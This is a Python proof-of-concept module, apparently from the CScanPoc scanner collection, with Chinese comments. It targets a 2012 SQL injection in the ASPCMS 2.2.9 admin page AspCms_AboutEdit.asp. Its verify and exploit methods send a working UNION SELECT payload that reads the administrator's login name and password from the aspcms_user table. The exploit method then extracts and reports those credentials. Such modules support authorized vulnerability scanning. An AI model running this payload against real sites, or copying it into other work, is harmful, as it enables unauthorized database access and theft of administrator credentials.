# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'ASPCMS_0002'  # 平台漏洞编号，留空
    name = 'ASPCMS /AspCms_AboutEdit.asp SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-02-10'  # 漏洞公布时间
    desc = '''
        后台文件 AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=4214'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ASPCMS'  # 漏洞应用名称
    product_version = '2.2.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7243fe84-bacd-411f-aed5-b29e7a986721'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload_exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
                   "%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,"
                   "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")
            verify_url = self.target + payload_exp
            content = requests.get(verify_url).text
            pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'   # 匹配用户名
                                 r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?', # 匹配密码
                                 re.I | re.S)
            match = pattern.match(content)
            if match:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload_exp = ("/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select"
                   "%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,"
                   "24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1")

            verify_url = self.target + payload_exp
            content = requests.get(verify_url).text
            pattern = re.compile(r'.*?name=[\'"]?SortName[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'   # 匹配用户名
                                 r'.*?name=[\'"]?PageTitle[\'"]?.*?value=[\'"]?(?P<password>\w+)[\'"]?', # 匹配密码
                                 re.I | re.S)
            match = pattern.match(content)
            if match:
                username = match.group("username")
                password = match.group("password")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password};\n具体请查看漏洞详情'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
